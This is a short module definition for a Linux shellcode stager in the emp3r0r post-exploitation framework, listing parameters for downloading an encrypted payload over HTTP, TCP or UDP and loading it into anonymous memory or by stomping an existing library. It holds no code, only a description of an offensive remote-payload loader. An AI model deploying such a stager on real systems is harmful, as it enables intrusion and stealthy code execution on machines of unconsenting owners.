name: shellcode_stager
author: jm33-ng
comment: A Linux shellcode stager that supports payload delivery via HTTP/TCP/UDP with encryption and compression. Use with emp3r0r-listener

parameters.name: LISTENER_TYPE
parameters.description: Listener protocol type: HTTP, TCP, or UDP

parameters.name: DOWNLOAD_HOST
parameters.description: The host to download the payload from, eg. 192.168.0.1

parameters.name: DOWNLOAD_PORT
parameters.description: The port to download the payload from, eg. 8000

parameters.name: DOWNLOAD_PATH
parameters.description: The path to download the payload from (HTTP only), eg. /payload

parameters.name: DOWNLOAD_KEY
parameters.description: The key to decrypt the payload

parameters.name: MODULE_PATH
parameters.description: Path to a writable and executable library on the target system to stomp (for PIE loading). Leave empty for anonymous memory loading.

parameters.name: DOWNLOADER_MODULE_PATH
parameters.description: Path to a library to stomp for the downloader (intermediate stage). Leave empty for anonymous memory.
